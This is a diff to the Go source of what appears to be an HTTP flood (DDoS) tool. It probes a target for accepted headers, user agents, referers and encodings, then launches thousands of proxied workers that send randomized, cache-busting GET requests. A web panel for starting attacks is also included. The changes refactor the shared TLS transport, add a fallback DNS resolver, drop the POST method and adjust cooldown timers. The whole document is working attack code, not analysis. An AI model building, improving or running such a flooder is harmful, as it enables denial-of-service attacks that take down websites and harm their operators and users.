@@ -22,18 +22,18 @@ import (
 )
 
 const (
-	HAPUS         = "\033[0m"
-	MERAH         = "\033[31m"
-	IJO           = "\033[32m"
-	PUTIH         = "\033[37m"
-	CANDY         = "\033[91m"
-	PUCAT         = "\033[38;5;203m"
-	PUNYAMU       = "\033[38;5;204m"
-	PUNYA_LU_PUCAT = "\033[38;5;218m"
-	MASA_DEPAN_NYA = "\033[97m"
-	Speed         = 7500
-	to            = 6 * time.Second
-	KEP           = 30 * time.Second
+	HAPUS           = "\033[0m"
+	MERAH           = "\033[31m"
+	IJO             = "\033[32m"
+	PUTIH           = "\033[37m"
+	CANDY           = "\033[91m"
+	PUCAT           = "\033[38;5;203m"
+	PUNYAMU         = "\033[38;5;204m"
+	PUNYA_LU_PUCAT  = "\033[38;5;218m"
+	MASA_DEPAN_NYA  = "\033[97m"
+	Speed           = 7500
+	to              = 6 * time.Second
+	KEP             = 30 * time.Second
 )
 
 type BPF struct {
@@ -223,12 +223,62 @@ func RST(rng *rand.Rand, length int) string {
 
 var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
 
-func PMP(target string) int {
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+func createTransport(host string, useCustomResolver bool) *http.Transport {
+	var dialer *net.Dialer
+	if useCustomResolver {
+		resolver := &net.Resolver{
+			PreferGo: true,
+			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+				d := net.Dialer{Timeout: 3 * time.Second}
+				return d.DialContext(ctx, "udp", "8.8.8.8:53")
+			},
+		}
+		dialer = &net.Dialer{
+			Timeout:   3 * time.Second,
+			KeepAlive: KEP,
+			Resolver:  resolver,
+		}
+	} else {
+		dialer = &net.Dialer{
+			Timeout:   3 * time.Second,
+			KeepAlive: KEP,
+		}
+	}
+	return &http.Transport{
+		DialContext: dialer.DialContext,
+		DisableKeepAlives:     false,
+		DisableCompression:    true,
+		MaxIdleConns:          20000,
+		MaxIdleConnsPerHost:   10000,
+		MaxConnsPerHost:       0,
+		IdleConnTimeout:       KEP,
+		WriteBufferSize:       32 << 10,
+		ReadBufferSize:        32 << 10,
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+			ServerName:         host,
+			MinVersion:         tls.VersionTLS12,
+			MaxVersion:         tls.VersionTLS13,
+			NextProtos:         []string{"h2", "http/1.1"},
+			Renegotiation:      tls.RenegotiateFreelyAsClient,
+			CipherSuites: []uint16{
+				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+			},
 		},
+		ForceAttemptHTTP2:     true,
+		TLSHandshakeTimeout:   3 * time.Second,
+		ResponseHeaderTimeout: 3 * time.Second,
+		ExpectContinueTimeout: 0 * time.Second,
+	}
+}
+
+func PMP(target string, tr *http.Transport) int {
+	client := &http.Client{
+		Timeout:   5 * time.Second,
+		Transport: tr,
 	}
 	sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
 	Berhasil := 0
@@ -245,6 +295,7 @@ func PMP(target string) int {
 		if err != nil {
 			break
 		}
+		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
 			Berhasil = size
@@ -257,12 +308,10 @@ func PMP(target string) int {
 	return Berhasil
 }
 
-func PMH(target string) int {
+func PMH(target string, tr *http.Transport) int {
 	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
+		Timeout:   5 * time.Second,
+		Transport: tr,
 	}
 	sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
 	Berhasil := 0
@@ -274,6 +323,7 @@ func PMH(target string) int {
 		if err != nil {
 			break
 		}
+		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
 			Berhasil = size
@@ -286,12 +336,10 @@ func PMH(target string) int {
 	return Berhasil
 }
 
-func PHR(target string, ProxyX string) map[string]bool {
+func PHR(target string, ProxyX string, tr *http.Transport) map[string]bool {
 	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
+		Timeout:   5 * time.Second,
+		Transport: tr,
 	}
 	parsedTarget, _ := url.Parse(target)
 	targetHost := parsedTarget.Hostname()
@@ -330,6 +378,7 @@ func PHR(target string, ProxyX string) map[string]bool {
 			result[h] = false
 			continue
 		}
+		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
 			result[h] = true
@@ -361,7 +410,11 @@ func HSUPPORT(target string) string {
 	return "H3"
 }
 
-func ORIGIN(target string) []string {
+func ORIGIN(target string, tr *http.Transport) []string {
+	client := &http.Client{
+		Timeout:   5 * time.Second,
+		Transport: tr,
+	}
 	parsed, _ := url.Parse(target)
 	host := parsed.Hostname()
 	candidates := []string{
@@ -372,12 +425,6 @@ func ORIGIN(target string) []string {
 		"",
 	}
 	var valid []string
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
 	for _, origin := range candidates {
 		req, _ := http.NewRequest("GET", target, nil)
 		req.Header.Set("User-Agent", "Mozilla/5.0")
@@ -388,6 +435,7 @@ func ORIGIN(target string) []string {
 		if err != nil {
 			continue
 		}
+		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
 			valid = append(valid, origin)
@@ -399,7 +447,11 @@ func ORIGIN(target string) []string {
 	return valid
 }
 
-func UA_TEST(target string) []string {
+func UA_TEST(target string, tr *http.Transport) []string {
+	client := &http.Client{
+		Timeout:   5 * time.Second,
+		Transport: tr,
+	}
 	testUAs := []string{
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
@@ -408,12 +460,6 @@ func UA_TEST(target string) []string {
 		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
 	}
 	var valid []string
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
 	for _, ua := range testUAs {
 		req, _ := http.NewRequest("GET", target, nil)
 		req.Header.Set("User-Agent", ua)
@@ -421,6 +467,7 @@ func UA_TEST(target string) []string {
 		if err != nil {
 			continue
 		}
+		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
 			valid = append(valid, ua)
@@ -432,7 +479,11 @@ func UA_TEST(target string) []string {
 	return valid
 }
 
-func REFFERER(target string) []string {
+func REFFERER(target string, tr *http.Transport) []string {
+	client := &http.Client{
+		Timeout:   5 * time.Second,
+		Transport: tr,
+	}
 	parsed, _ := url.Parse(target)
 	host := parsed.Hostname()
 	testReferers := []string{
@@ -443,12 +494,6 @@ func REFFERER(target string) []string {
 		"",
 	}
 	var valid []string
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
 	for _, ref := range testReferers {
 		req, _ := http.NewRequest("GET", target, nil)
 		req.Header.Set("User-Agent", "Mozilla/5.0")
@@ -459,6 +504,7 @@ func REFFERER(target string) []string {
 		if err != nil {
 			continue
 		}
+		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
 			valid = append(valid, ref)
@@ -470,46 +516,13 @@ func REFFERER(target string) []string {
 	return valid
 }
 
-func HMETHOD(target string) []string {
-	methods := []string{"GET", "POST", "OPTIONS"}
-	var valid []string
+func ENCOD(target string, tr *http.Transport) []string {
 	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
+		Timeout:   5 * time.Second,
+		Transport: tr,
 	}
-	for _, method := range methods {
-		req, _ := http.NewRequest(method, target, nil)
-		if method == "POST" {
-			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-			req.Body = io.NopCloser(strings.NewReader(""))
-		}
-		req.Header.Set("User-Agent", "Mozilla/5.0")
-		resp, err := client.Do(req)
-		if err != nil {
-			continue
-		}
-		resp.Body.Close()
-		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
-			valid = append(valid, method)
-		}
-	}
-	if len(valid) == 0 {
-		valid = append(valid, "GET")
-	}
-	return valid
-}
-
-func ENCOD(target string) []string {
 	encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
 	var valid []string
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
 	for _, enc := range encodings {
 		req, _ := http.NewRequest("GET", target, nil)
 		req.Header.Set("User-Agent", "Mozilla/5.0")
@@ -518,6 +531,7 @@ func ENCOD(target string) []string {
 		if err != nil {
 			continue
 		}
+		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
 			valid = append(valid, enc)
@@ -529,15 +543,13 @@ func ENCOD(target string) []string {
 	return valid
 }
 
-func CACH(target string) []string {
+func CACH(target string, tr *http.Transport) []string {
+	client := &http.Client{
+		Timeout:   5 * time.Second,
+		Transport: tr,
+	}
 	controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
 	var valid []string
-	client := &http.Client{
-		Timeout: 5 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		},
-	}
 	for _, cc := range controls {
 		req, _ := http.NewRequest("GET", target, nil)
 		req.Header.Set("User-Agent", "Mozilla/5.0")
@@ -546,6 +558,7 @@ func CACH(target string) []string {
 		if err != nil {
 			continue
 		}
+		io.Copy(io.Discard, resp.Body)
 		resp.Body.Close()
 		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
 			valid = append(valid, cc)
@@ -641,6 +654,19 @@ func runAttack(tgt string, dur int, cookie string) {
 	if strings.HasPrefix(host, "www.") {
 		host = host[4:]
 	}
+
+	// Cek DNS dengan resolver default, jika gagal pakai custom
+	useCustom := false
+	ctxDNS, cancelDNS := context.WithTimeout(context.Background(), 2*time.Second)
+	defer cancelDNS()
+	addrs, err := net.DefaultResolver.LookupHost(ctxDNS, host)
+	if err != nil || len(addrs) == 0 {
+		useCustom = true
+	}
+
+	probeTransport := createTransport(host, useCustom)
+	attackTransport := createTransport(host, useCustom)
+
 	var PRX []*url.URL
 	file, err := os.Open("proxy.txt")
 	if err == nil {
@@ -685,12 +711,11 @@ func runAttack(tgt string, dur int, cookie string) {
 		VORI      []string
 		VUAS      []string
 		VREF      []string
-		VMET      []string
 		VENC      []string
 		VCAC      []string
 	)
 	var wg sync.WaitGroup
-	wg.Add(10)
+	wg.Add(9)
 	var probeDone int
 	var probeMu sync.Mutex
 	printProbe := func(name string) {
@@ -698,21 +723,21 @@ func runAttack(tgt string, dur int, cookie string) {
 		probeDone++
 		done := probeDone
 		probeMu.Unlock()
-		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/10)
+		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/9)
 	}
 	go func() {
 		defer wg.Done()
-		MaxP = PMP(tgt)
+		MaxP = PMP(tgt, probeTransport)
 		printProbe("PMP")
 	}()
 	go func() {
 		defer wg.Done()
-		MaxHead = PMH(tgt)
+		MaxHead = PMH(tgt, probeTransport)
 		printProbe("PMH")
 	}()
 	go func() {
 		defer wg.Done()
-		Supported = PHR(tgt, ProxyX)
+		Supported = PHR(tgt, ProxyX, probeTransport)
 		printProbe("PHR")
 	}()
 	go func() {
@@ -722,69 +747,43 @@ func runAttack(tgt string, dur int, cookie string) {
 	}()
 	go func() {
 		defer wg.Done()
-		VORI = ORIGIN(tgt)
+		VORI = ORIGIN(tgt, probeTransport)
 		printProbe("ORIGIN")
 	}()
 	go func() {
 		defer wg.Done()
-		VUAS = UA_TEST(tgt)
+		VUAS = UA_TEST(tgt, probeTransport)
 		printProbe("UA")
 	}()
 	go func() {
 		defer wg.Done()
-		VREF = REFFERER(tgt)
+		VREF = REFFERER(tgt, probeTransport)
 		printProbe("REFFERER")
 	}()
 	go func() {
 		defer wg.Done()
-		VMET = HMETHOD(tgt)
-		printProbe("HMETHOD")
-	}()
-	go func() {
-		defer wg.Done()
-		VENC = ENCOD(tgt)
+		VENC = ENCOD(tgt, probeTransport)
 		printProbe("ENCOD")
 	}()
 	go func() {
 		defer wg.Done()
-		VCAC = CACH(tgt)
+		VCAC = CACH(tgt, probeTransport)
 		printProbe("CACHE")
 	}()
 	wg.Wait()
 	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
+
 	wcs := make([]CLI, len(PRX))
 	for i, ProxyY := range PRX {
-		tr := &http.Transport{
-			DialContext: (&net.Dialer{
-				Timeout:   3 * time.Second,
-				KeepAlive: KEP,
-			}).DialContext,
-			DisableKeepAlives:     false,
-			DisableCompression:    true,
-			MaxIdleConns:          20000,
-			MaxIdleConnsPerHost:   10000,
-			MaxConnsPerHost:       0,
-			IdleConnTimeout:       KEP,
-			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: true,
-				MinVersion:         tls.VersionTLS12,
-				MaxVersion:         tls.VersionTLS13,
-				NextProtos:         []string{"h2", "http/1.1"},
-				CipherSuites: []uint16{
-					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-				},
-			},
-			ForceAttemptHTTP2:     true,
-			TLSHandshakeTimeout:   3 * time.Second,
-			ResponseHeaderTimeout: 3 * time.Second,
-			ExpectContinueTimeout: 0 * time.Second,
+		tr := attackTransport
+		if ProxyY != nil {
+			// Clone transport untuk proxy
+			tr2 := tr.Clone()
+			tr2.Proxy = http.ProxyURL(ProxyY)
+			tr = tr2
 		}
 		ip := ""
 		if ProxyY != nil {
-			tr.Proxy = http.ProxyURL(ProxyY)
 			ip = ProxyY.Hostname()
 		}
 		client := &http.Client{
@@ -827,7 +826,7 @@ func runAttack(tgt string, dur int, cookie string) {
 	printInfo("Author", "Diz Flyze Ofc              ", "True")
 	printInfo("Target", host, "")
 	printInfo("Port  ", "443                        ", "True")
-	printInfo("Method", "H2-FLOW                    ", "True")
+	printInfo("Method", "GET                       ", "True")
 	printInfo("Proxy ", fmt.Sprintf("%d                        ", len(PRX)), "True")
 	printInfo("Worker", fmt.Sprintf("%d                       ", Speed), "True")
 	printInfo("HTTP  ", fmt.Sprintf("%-24s   ", HVERSI), "True")
@@ -884,7 +883,7 @@ func runAttack(tgt string, dur int, cookie string) {
 			defer wg2.Done()
 			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
 			for ctx.Err() == nil {
-				method := VMET[rng.Intn(len(VMET))]
+				method := "GET"
 				ua := VUAS[rng.Intn(len(VUAS))]
 				ref := VREF[rng.Intn(len(VREF))]
 				enc := VENC[rng.Intn(len(VENC))]
@@ -919,17 +918,9 @@ func runAttack(tgt string, dur int, cookie string) {
 				if rng.Intn(10) == 0 {
 					targetURL += "&" + RST(rng, 8) + "=" + RST(rng, 12)
 				}
-				var body io.Reader
-				if method == "POST" {
-					body = strings.NewReader("")
-				} else {
-					body = nil
-				}
+				var body io.Reader = nil
 				req, _ := http.NewRequest(method, targetURL, body)
 				headers := []headerItem{}
-				if method == "POST" {
-					headers = append(headers, headerItem{"Content-Type", "application/x-www-form-urlencoded"})
-				}
 				headers = append(headers, headerItem{"User-Agent", ua})
 				headers = append(headers, headerItem{"Accept-Encoding", enc})
 				headers = append(headers, headerItem{"Cache-Control", cacheCtrl})
@@ -958,27 +949,6 @@ func runAttack(tgt string, dur int, cookie string) {
 				headers = append(headers, headerItem{"Sec-Fetch-Dest", prof.SecFetchDest})
 				if prof.DNT != "" {
 					headers = append(headers, headerItem{"DNT", prof.DNT})
-				}
-				if rng.Intn(3) == 0 {
-					headers = append(headers, headerItem{"TE", "trailers"})
-				}
-				if rng.Intn(4) == 0 {
-					headers = append(headers, headerItem{"A-IM", "Feed"})
-				}
-				if rng.Intn(4) == 0 {
-					headers = append(headers, headerItem{"Delta-Base", "12340001"})
-				}
-				if rng.Intn(3) == 0 {
-					headers = append(headers, headerItem{"dnt", "1"})
-				}
-				if rng.Intn(4) == 0 {
-					headers = append(headers, headerItem{"Access-Control-Request-Method", "GET"})
-				}
-				if rng.Intn(5) == 0 {
-					headers = append(headers, headerItem{"source-ip", RST(rng, 5)})
-				}
-				if rng.Intn(4) == 0 {
-					headers = append(headers, headerItem{"Data-Return", "false"})
 				}
 				if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
 					headers = append(headers, headerItem{"X-Original-URL", "/" + strconv.FormatInt(rng.Int63(), 16)})
@@ -1040,6 +1010,7 @@ func runAttack(tgt string, dur int, cookie string) {
 				}
 				resp, err := cli.client.Do(req)
 				if err == nil {
+					io.Copy(io.Discard, resp.Body)
 					resp.Body.Close()
 				}
 			}
@@ -1345,7 +1316,7 @@ func startWebAndTunnel() {
 			ipTargetMutex.Lock()
 			now = time.Now()
 			for k, t := range ipTargetLast {
-				if now.Sub(t) > 10*time.Minute {
+				if now.After(t) {
 					delete(ipTargetLast, k)
 				}
 			}
@@ -1485,9 +1456,9 @@ func startWebAndTunnel() {
 		clientIP := getClientIP(r)
 		key := clientIP + "|" + target
 		ipTargetMutex.Lock()
-		lastTime, exists := ipTargetLast[key]
+		expiry, exists := ipTargetLast[key]
 		now := time.Now()
-		if exists && now.Sub(lastTime) < 5*time.Minute {
+		if exists && now.Before(expiry) {
 			ipTargetMutex.Unlock()
 			http.Error(w, "You are banned for 5 minutes", http.StatusForbidden)
 			return
@@ -1535,10 +1506,10 @@ func startWebAndTunnel() {
 			cooldownUntil = time.Now().Add(30 * time.Second)
 			stateMutex.Unlock()
 			ipCooldownMutex.Lock()
-			ipCooldownMap[ip] = time.Now().Add(3 * time.Minute)
+			ipCooldownMap[ip] = time.Now().Add(1 * time.Minute)
 			ipCooldownMutex.Unlock()
 			ipTargetMutex.Lock()
-			ipTargetLast[ip+"|"+tgt] = time.Now()
+			ipTargetLast[ip+"|"+tgt] = time.Now().Add(5 * time.Minute)
 			ipTargetMutex.Unlock()
 		}(clientIP, target, dur)
 		w.WriteHeader(http.StatusOK)
